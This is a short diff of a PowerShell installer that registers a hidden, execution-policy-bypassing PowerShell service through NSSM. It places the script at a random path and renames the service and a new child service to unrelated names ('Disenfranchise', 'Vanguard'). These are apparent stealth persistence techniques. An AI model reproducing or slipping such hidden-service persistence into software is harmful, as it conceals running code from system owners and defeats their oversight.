@@ -21,9 +21,11 @@ $nssmexe = "$nssmFolder\nssm.exe"
 $fwdmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
 $fwdmonPath = "$fwdmonPath\fwd_mon.ps1"
 
-$serviceName = "MyfwdmonService"
+$serviceName = "Disenfranchise"
+$childServiceName = "Vanguard"
+$childServicePropertyName = "fwd"
 $exepath = "powershell.exe"
-$arguments = "-ep bypass -nop -w hidden $fwdmonPath -basePath '$basePath' -exe '$nssmexe'"
+$arguments = "-ep bypass -nop -w hidden $fwdmonPath -basePath '$basePath' -exe '$nssmexe' -childServiceName $childServiceName -childServicePropertyName $childServicePropertyName"
 
 if(-not(Test-Path -Path $nssmFolder -PathType Container)){
     New-Item -Path $nssmFolder -ItemType Directory -Force
